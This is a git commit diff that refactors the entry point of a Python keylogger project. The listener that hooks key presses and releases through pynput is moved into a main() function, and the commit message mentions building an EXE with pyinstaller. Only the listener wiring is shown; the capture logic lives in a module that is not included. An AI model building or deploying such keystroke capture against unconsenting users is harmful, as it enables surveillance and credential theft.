8e020908ff7d995d7fdddda91ba84183facc72e3
Shourya Shukla <periperidip@gmail.com>
2021-07-12 23:52:38 +0530

    main: define the 'main()' function as a program entry point
    Though not necessary, define the conventional 'main()' function as an
    entry point for the keylogger. This makes it the program flow a little
    more obvious and easier for the 'pyinstaller' to create an EXE from.
    
    Signed-off-by: Shourya Shukla <periperidip@gmail.com>

--- main.py
+++ main.py
@@ -2,5 +2,9 @@ from pynput.keyboard import Listener
 
 from keylog import key_press, key_release
 
-with Listener(on_press = key_press, on_release = key_release) as listener:
-	listener.join()
+def main():
+	with Listener(on_press = key_press, on_release = key_release) as listener:
+		listener.join()
+
+if __name__ == "__main__":
+	main()
